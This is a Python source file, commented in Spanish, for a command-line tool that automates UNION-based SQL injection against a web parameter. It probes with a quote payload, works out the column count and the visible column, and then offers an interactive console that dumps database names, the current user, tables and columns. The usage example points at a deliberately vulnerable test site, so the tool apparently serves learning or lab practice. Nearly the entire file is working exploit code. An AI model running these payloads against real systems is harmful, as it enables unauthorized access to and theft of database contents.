import requests
import argparse
import sys
import re

def realizar_peticion(url, params):
    """
    Función genérica para hacer peticiones.
    Acepta un diccionario 'params' ya construido.
    """
    headers = {'User-Agent': 'Mozilla/5.0'}
    try:
        r = requests.get(url, params=params, headers=headers, cookies=cookies, timeout=10)
        return r.text
    except requests.exceptions.RequestException as e:
        print(f"\n[!] Error de conexión: {e}")
        sys.exit(1)





def check_for_sqli(target_url, param, extra_params=None):
    """
    Genera un error SQLi para comprobar vulnerabilidad.
    
    :param target_url: Target URL
    :param param: Comma-separated vulnerable parameters
    """

    payload_error = "1'" # Payload simple para generar error SQL
    params = extra_params.copy() if extra_params else {}
    params[param] = payload_error

    print(f"[+] Probando parámetro: {param}")
    respuesta = realizar_peticion(target_url, params)
    
    # Debug: imprimir respuesta HTML
    print("\n[DEBUG] Respuesta HTML:")
    print("-" * 50)
    print(respuesta)
    print("-" * 50)
    
    # Buscar indicios de error SQL en la respuesta
    errores_sql = [
        "you have an error in your sql syntax",
        "warning: mysql",
        "unclosed quotation mark after the character string",
        "quoted string not properly terminated",
        "sql syntax",
        "mysql_fetch",
        "mysql_num_rows",
        "pg_query",
        "syntax error",
        "mysql",
        "unclosed quotation"
    ]

    for error in errores_sql:
        if error.lower() in respuesta.lower():
            print(f"  ¡VULNERABLE! Error detectado.")
            return True
    
    print("  No se detectó vulnerabilidad evidente (Error Based).")
    return False

def obtener_num_columnas(url, param_vulnerable, otros_params):
    """
    Fase 1 Explotación: Determinar número de columnas usando UNION SELECT.
    Prueba diferentes tipos de inyección: comilla simple, comilla doble y entero.
    """
    print("[*] Calculando número de columnas...")
    
    # Diferentes prefijos según el tipo de inyección
    # Usamos la forma AND para forzar la condición a FALSE y evitar resultados originales
    prefijos = [
        ("comilla simple", "1' AND '1'='0' UNION SELECT "),
        ("comilla doble", '1" AND "1"="0" UNION SELECT '),
        ("entero", "1 AND 1=0 UNION SELECT ")
    ]
    
    for tipo, prefijo in prefijos:
        print(f"  [*] Probando tipo: {tipo}")
        for i in range(1, 50):
            # Generar un payload con i columnas usando marcadores únicos
            marcadores = [f"'col{j}mark'" for j in range(1, i + 1)]
            payload = f"{prefijo}{','.join(marcadores)} -- -"
            
            params_actuales = otros_params.copy()
            params_actuales[param_vulnerable] = payload
            
            html = realizar_peticion(url, params_actuales)
            
            # Verificar si hay error SQL
            errores_sql = [
                "you have an error in your sql syntax",
                "warning: mysql",
                "unclosed quotation mark after the character string",
                "quoted string not properly terminated",
                "sql syntax",
                "mysql_fetch",
                "mysql_num_rows",
                "pg_query",
                "syntax error",
                "unclosed quotation",
                "unknown column",
                "different number of columns",
                "operand should contain"
            ]
            
            tiene_error = any(error.lower() in html.lower() for error in errores_sql)
            
            # Verificar si los marcadores aparecen en la respuesta (inyección exitosa)
            marcador_encontrado = any(f"col{j}mark" in html for j in range(1, i + 1))
            
            if not tiene_error and marcador_encontrado:
                print(f"[+] Número de columnas encontrado: {i} (tipo: {tipo})")
                return i, tipo
    
    print("[-] No se pudo determinar el número de columnas con UNION SELECT.")
    return None, None

def encontrar_columna_visible(url, param_vulnerable, otros_params, num_cols, tipo_inyeccion):
    """
    Fase 2 Explotación: Determinar qué columna imprime datos en pantalla.
    """
    print("[*] Buscando columna visible...")
    
    # Determinar prefijo según tipo de inyección
    if tipo_inyeccion == "comilla simple":
        prefijo = "1' AND '1'='0' UNION SELECT "
        sufijo = " -- -"
    elif tipo_inyeccion == "comilla doble":
        prefijo = '1" AND "1"="0" UNION SELECT '
        sufijo = " -- -"
    else:  # entero
        prefijo = "1 AND 1=0 UNION SELECT "
        sufijo = " -- -"
    
    # Creamos un payload tipo: UNION SELECT 1111, 2222, 3333...
    # Usamos números únicos para buscarlos en el HTML
    marcadores = [str(i)*4 for i in range(1, num_cols + 1)]
    union_payload = f"{prefijo}{','.join(marcadores)}{sufijo}"
    
    params = otros_params.copy()
    params[param_vulnerable] = union_payload
    
    html = realizar_peticion(url, params)
    
    for i, marcador in enumerate(marcadores):
        if marcador in html:
            print(f"[+] Columna visible encontrada: {i + 1}")
            return i + 1
            
    print("[-] No se encontró ninguna columna visible (Blind SQLi?).")
    return None

def extraer_dato(url, param_vulnerable, otros_params, num_cols, col_visible, query_sql, tipo_inyeccion):
    """
    Fase 3 Explotación: Extraer datos usando la columna visible.
    """

    # Determinar prefijo según tipo de inyección
    if tipo_inyeccion == "comilla simple":
        prefijo = "1' AND '1'='0' UNION SELECT "
        sufijo = " -- -"
    elif tipo_inyeccion == "comilla doble":
        prefijo = '1" AND "1"="0" UNION SELECT '
        sufijo = " -- -"
    else:  # entero
        prefijo = "1 AND 1=0 UNION SELECT "
        sufijo = " -- -"

    # Construimos la lista de columnas para el UNION
    cols = [str(i) for i in range(1, num_cols + 1)]
    
    # En la columna visible, insertamos la query que queremos ejecutar con marcadores
    # concat('SQLI', ..., 'SLQI') para facilitar la extracción
    cols[col_visible - 1] = f"concat('SQLI', ({query_sql}), 'SLQI')"
    
    # Usamos -1 para que no haya resultados del registro original
    payload = f"{prefijo}{','.join(cols)}{sufijo}"
    
    params = otros_params.copy()
    params[param_vulnerable] = payload
    
    html = realizar_peticion(url, params)

    # Extracción usando regex - buscamos TODAS las ocurrencias
    matches = re.findall(r'SQLI(.*?)SLQI', html)
    
    # Filtrar: el dato real NO contiene "SELECT" (filtrar por si hay payload reflejado)
    for match in matches:
        if query_sql.upper() not in match.upper():
            return match
    
    return "No se pudo extraer el dato"


def menu_interactivo(url, param_vulnerable, otros_params, num_cols, col_visible, tipo_inyeccion):
    """
    Fase 4: Interactividad tipo SQLMap
    """
    print("\n" + "="*40)
    print(" CONSOLA DE EXPLOTACIÓN SQLI ")
    print("="*40)

    bbdd = extraer_dato(url, param_vulnerable, otros_params, num_cols, col_visible, "database()", tipo_inyeccion)
    print(f"\n[+] Base de datos actual: {bbdd}")

    print("\nOpciones:")
    print("1. Obtener Bases de datos")
    print("2. Usar Base de datos actual (la usada en el campo vulnerable)")
    print("3. Obtener Usuario actual")
    print("4. Listar Tablas")
    print("5. Listar Columnas de una Tabla")
    print("6. Salir")
    
    while True:
        
        opcion = input("\nSQLi> ")
        
        if opcion == '1':
            query = "SELECT group_concat(schema_name) FROM information_schema.schemata"
            res = extraer_dato(url, param_vulnerable, otros_params, num_cols, col_visible, query, tipo_inyeccion)
            print(f"\n[+] Bases de Datos: {res}")
            res = res.split(',')
            if res:
                bbdd = input("Selecciona la base de datos a usar: ")
                if bbdd in res:
                    print(f"[+] Base de datos seleccionada: {bbdd}")
                else:
                    print("[-] Base de datos no válida, se usará la predeterminada.")
                    bbdd = extraer_dato(url, param_vulnerable, otros_params, num_cols, col_visible, "database()", tipo_inyeccion)
            
        elif opcion == '2':
            res = extraer_dato(url, param_vulnerable, otros_params, num_cols, col_visible, "database()", tipo_inyeccion)
            print(f"\n[+] Base de Datos: {res}")
            bbdd = res
            
        elif opcion == '3':
            res = extraer_dato(url, param_vulnerable, otros_params, num_cols, col_visible, "user()", tipo_inyeccion)
            print(f"\n[+] Usuario: {res}")
            
        elif opcion == '4':
            # group_concat para sacar todo en una sola petición
            query = f"SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema='{bbdd}'"
            res = extraer_dato(url, param_vulnerable, otros_params, num_cols, col_visible, query, tipo_inyeccion)
            print(f"\n[+] Tablas: {res}")

        elif opcion == '5':
            tabla = input("Introduce el nombre de la tabla: ")
            query = f"SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema='{bbdd}' AND table_name='{tabla}'"
            res = extraer_dato(url, param_vulnerable, otros_params, num_cols, col_visible, query, tipo_inyeccion)
            print(f"\n[+] Columnas de {tabla}: {res}")
            
        elif opcion == '6':
            print("Saliendo...")
            break
        else:
            print("Opción no válida")
            print("\nOpciones:")
            print("1. Obtener Bases de datos")
            print("2. Usar Base de datos actual (la usada en el campo vulnerable)")
            print("3. Obtener Usuario actual")
            print("4. Listar Tablas")
            print("5. Listar Columnas de una Tabla")
            print("6. Salir")
    


def parse_args():

    man = """
    Herramienta de Automatización SQLi - Jorge Matesanz
    Uso:
        python3 Script.py -u <URL_OBJETIVO> -p <PARAM_VULNERABLE> [opciones]
        Si se quiere probar más de un parámetro hace falta ejecutar varias veces la herramienta.
    Ejemplo:
        python3 Script.py -u "http://testphp.vulnweb.com/artists.php" -p "artist"
    Opciones:
        -c, --cookies    Cookies HTTP (ej: 'PHPSESSID=abc123;user=admin;security=low')
        -e, --extra      Parámetros extra necesarios para hacer la petición (ej: 'Submit=Submit,email=example@example.com')
    """
    parser = argparse.ArgumentParser(description="Herramienta de Automatización SQLi - Jorge Matesanz", epilog=man, formatter_class=argparse.RawDescriptionHelpFormatter)

    # 1. Argumento Obligatorio - url
    parser.add_argument("-u", "--url", dest="target_url", required=True, help="URL objetivo (ej: http://sitio.com/news.php)")

    # 2. Argumento Obligatorio - parametro
    parser.add_argument("-p", "--param", dest="param", required=True, help="Parámetro vulnerable separado(ej: id)")

    # 3. Argumento Opcional - cookies
    parser.add_argument("-c", "--cookies", dest="cookies", help="Cookies HTTP (ej: 'PHPSESSID=abc123;user=admin')")
    
    # 4. Argumento Opcional - extra parameters
    parser.add_argument("-e", "--extra", help="Parámetros extra necesarios para hacer la petición (ej: 'Submit=Submit,security=low')")

    
    args = parser.parse_args()
    return args

def main():
    args = parse_args()

    # Configuración desde argumentos
    target_url = args.target_url
    vuln_param = args.param
    
    # Procesar parámetros extra (estáticos)
    otros_params = {}
    if args.extra:
        for pair in args.extra.split(','):
            pair = pair.strip()
            if not pair or '=' not in pair:
                continue
            key, value = pair.split('=', 1)
            otros_params[key] = value
    


    global cookies
    if args.cookies:
        # Convertir cadena de cookies en diccionario
        cookies = {}
        for pair in args.cookies.split(';'):
            pair = pair.strip()
            if not pair or '=' not in pair:
                continue
            key, value = pair.split('=', 1)
            cookies[key] = value
    else:
        cookies = None

    if check_for_sqli(target_url, vuln_param, otros_params):
        print("\n[+] La URL es vulnerable a SQL Injection.")

        num_columnas, tipo_inyeccion = obtener_num_columnas(target_url, vuln_param, otros_params)

        if num_columnas:
            col_visible = encontrar_columna_visible(target_url, vuln_param, otros_params, num_columnas, tipo_inyeccion)
            if col_visible:
                menu_interactivo(target_url, vuln_param, otros_params, num_columnas, col_visible, tipo_inyeccion)
    else:
        print("\n[-] No se detectó vulnerabilidad SQLi en la URL.")
    

if __name__ == "__main__":
    main()